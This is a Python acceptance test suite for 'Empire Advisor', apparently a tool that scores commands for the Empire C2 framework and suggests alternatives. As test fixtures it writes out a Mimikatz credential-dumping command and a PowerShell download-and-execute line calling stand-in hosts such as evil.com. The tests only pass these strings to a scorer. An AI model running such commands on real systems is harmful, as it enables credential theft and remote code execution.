#!/usr/bin/env python3
"""
Test suite for Empire Advisor

Validates acceptance criteria from ACCEPTANCE.md
"""

import json
import sys
from pathlib import Path
from empire_advisor import EmpireAdvisor, AdvisoryResult
from empire_plugin import StandaloneShim


class TestSuite:
    """Test suite for Empire Advisor acceptance criteria"""

    def __init__(self):
        """Initialize test suite"""
        self.advisor = EmpireAdvisor()
        self.shim = StandaloneShim()
        self.results = []
        self.passed = 0
        self.failed = 0

    def log(self, message: str, status: str = "INFO"):
        """Log test message"""
        prefix = {
            "PASS": "✓",
            "FAIL": "✗",
            "INFO": "→"
        }.get(status, "•")
        print(f"{prefix} {message}")

    def assert_true(self, condition: bool, test_id: str, description: str):
        """Assert condition is true"""
        if condition:
            self.log(f"{test_id}: {description}", "PASS")
            self.passed += 1
            self.results.append({"id": test_id, "status": "PASS", "description": description})
        else:
            self.log(f"{test_id}: {description}", "FAIL")
            self.failed += 1
            self.results.append({"id": test_id, "status": "FAIL", "description": description})

    def test_a1_plugin_loads(self):
        """A1: Plugin or shim loads via documented procedure"""
        try:
            shim = StandaloneShim()
            self.assert_true(
                shim.plugin.enabled,
                "A1",
                "Plugin/shim loads successfully"
            )
        except Exception as e:
            self.assert_true(False, "A1", f"Plugin load failed: {e}")

    def test_a2_advisory_without_execution(self):
        """A2: Submitting fixture command produces advisory without executing"""
        test_cmd = "Invoke-Mimikatz -DumpCreds"
        result = self.advisor.evaluate_command(test_cmd)

        # Verify result structure
        has_score = result.score >= 0
        has_advisory = result.advisory_state in ['allow', 'warn', 'block']
        no_execution = True  # No actual execution happens in evaluate_command

        self.assert_true(
            has_score and has_advisory and no_execution,
            "A2",
            "Advisory produced without execution"
        )

    def test_a3_rules_count(self):
        """A3: rules.yaml contains ≥10 rules with id + rationale"""
        rule_count = len(self.advisor.rules)
        all_have_rationale = all(
            rule.id and rule.rationale
            for rule in self.advisor.rules
        )

        self.assert_true(
            rule_count >= 10 and all_have_rationale,
            "A3",
            f"Rules file has {rule_count} rules with id + rationale"
        )

    def test_a4_determinism(self):
        """A4: Same input twice → identical score"""
        test_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"

        result1 = self.advisor.evaluate_command(test_cmd)
        result2 = self.advisor.evaluate_command(test_cmd)

        identical = (
            result1.score == result2.score and
            result1.risk_level == result2.risk_level and
            len(result1.matched_rules) == len(result2.matched_rules)
        )

        self.assert_true(
            identical,
            "A4",
            f"Deterministic scoring: {result1.score} == {result2.score}"
        )

    def test_a5_fixture_triggers_suggestion(self):
        """A5: At least one fixture triggers suggestion with KB citation"""
        fixture_path = Path("testdata/fixture_commands.txt")
        if not fixture_path.exists():
            self.assert_true(False, "A5", "Fixture file not found")
            return

        with open(fixture_path, 'r') as f:
            commands = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        found_suggestion = False
        for cmd in commands:
            result = self.advisor.evaluate_command(cmd)
            if result.suggestions:
                # Verify suggestion has KB citation
                for sug in result.suggestions:
                    if 'kb_citation' in sug and sug['kb_citation']:
                        found_suggestion = True
                        self.log(f"  Found suggestion for: {cmd[:50]}...", "INFO")
                        break
            if found_suggestion:
                break

        self.assert_true(
            found_suggestion,
            "A5",
            "At least one fixture triggers suggestion with KB citation"
        )

    def test_a6_offline_fixture_mode(self):
        """A6: Offline fixture mode works without live Empire C2"""
        fixture_path = Path("testdata/fixture_commands.txt")
        if not fixture_path.exists():
            self.assert_true(False, "A6", "Fixture file not found")
            return

        try:
            with open(fixture_path, 'r') as f:
                commands = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            results = self.shim.batch_evaluate(commands)

            # Verify results were generated
            offline_works = len(results) == len(commands) and all('score' in r for r in results)

            self.assert_true(
                offline_works,
                "A6",
                f"Offline mode processed {len(results)} fixture commands"
            )
        except Exception as e:
            self.assert_true(False, "A6", f"Offline mode failed: {e}")

    def test_a7_readme_exists(self):
        """A7: README documents compatibility or shim limits"""
        readme_path = Path("README.md")
        exists = readme_path.exists()

        if exists:
            content = readme_path.read_text()
            has_compatibility = 'Empire' in content and ('compatibility' in content.lower() or 'shim' in content.lower())
            self.assert_true(
                has_compatibility,
                "A7",
                "README documents Empire compatibility/shim"
            )
        else:
            self.assert_true(False, "A7", "README.md not found")

    def test_a8_opsec_card(self):
        """A8: OPSEC_CARD.md with Detection Recommendations (≥3 bullets)"""
        opsec_path = Path("OPSEC_CARD.md")
        if not opsec_path.exists():
            self.assert_true(False, "A8", "OPSEC_CARD.md not found")
            return

        content = opsec_path.read_text()
        has_detection_section = 'Detection Recommendation' in content
        bullet_count = content.count('\n-') + content.count('\n*')

        self.assert_true(
            has_detection_section and bullet_count >= 3,
            "A8",
            f"OPSEC_CARD.md has Detection Recommendations ({bullet_count} bullets)"
        )

    def test_a9_authorized_use_notice(self):
        """A9: Authorized-use notice present"""
        auth_path = Path("AUTHORIZED_USE.md")
        readme_path = Path("README.md")

        has_auth_file = auth_path.exists()
        has_notice_in_readme = False

        if readme_path.exists():
            readme_content = readme_path.read_text()
            has_notice_in_readme = 'authorized' in readme_content.lower() and 'use' in readme_content.lower()

        self.assert_true(
            has_auth_file or has_notice_in_readme,
            "A9",
            "Authorized-use notice present"
        )

    def test_m1_rationale_understandable(self):
        """M1: Scoring rationale understandable without reading source"""
        test_cmd = "Invoke-Mimikatz -DumpCreds"
        result = self.advisor.evaluate_command(test_cmd)

        has_rationale = all(
            'rationale' in rule and len(rule['rationale']) > 20
            for rule in result.matched_rules
        )

        self.assert_true(
            has_rationale,
            "M1",
            "All matched rules have detailed rationales"
        )

    def test_m2_suggestions_are_alternatives(self):
        """M2: Suggestions are alternatives in KB, not vague advice"""
        test_cmd = "Invoke-Mimikatz -DumpCreds"
        result = self.advisor.evaluate_command(test_cmd)

        if result.suggestions:
            has_commands = all(
                'alternative_commands' in sug and sug['alternative_commands']
                for sug in result.suggestions
            )
            self.assert_true(
                has_commands,
                "M2",
                "Suggestions include concrete alternative commands"
            )
        else:
            # Try another command that should have suggestions
            result2 = self.advisor.evaluate_command("IEX (New-Object Net.WebClient).DownloadString('http://x.com/p')")
            has_commands = any(
                'alternative_commands' in sug and sug['alternative_commands']
                for sug in result2.suggestions
            )
            self.assert_true(
                has_commands,
                "M2",
                "Suggestions include concrete alternative commands"
            )

    def test_m3_dangerous_rules_warn(self):
        """M3: Dangerous rules default to warn/block, not silent"""
        dangerous_cmd = "Invoke-Mimikatz -DumpCreds"
        result = self.advisor.evaluate_command(dangerous_cmd)

        proper_advisory = result.advisory_state in ['warn', 'block']

        self.assert_true(
            proper_advisory,
            "M3",
            f"Dangerous command gets '{result.advisory_state}' advisory"
        )

    def run_all(self):
        """Run all tests"""
        print("\n" + "=" * 80)
        print("Empire Advisor - Acceptance Test Suite")
        print("=" * 80 + "\n")

        # Acceptance criteria tests
        self.log("Running acceptance criteria tests...", "INFO")
        self.test_a1_plugin_loads()
        self.test_a2_advisory_without_execution()
        self.test_a3_rules_count()
        self.test_a4_determinism()
        self.test_a5_fixture_triggers_suggestion()
        self.test_a6_offline_fixture_mode()
        self.test_a7_readme_exists()
        self.test_a8_opsec_card()
        self.test_a9_authorized_use_notice()

        # Manual fidelity tests
        print()
        self.log("Running manual fidelity tests...", "INFO")
        self.test_m1_rationale_understandable()
        self.test_m2_suggestions_are_alternatives()
        self.test_m3_dangerous_rules_warn()

        # Summary
        print("\n" + "=" * 80)
        print(f"Test Summary: {self.passed} passed, {self.failed} failed")
        print("=" * 80 + "\n")

        # Save results
        results_path = Path("testdata/test_results.json")
        with open(results_path, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"Results saved to: {results_path}")

        return self.failed == 0


if __name__ == '__main__':
    suite = TestSuite()
    success = suite.run_all()
    sys.exit(0 if success else 1)
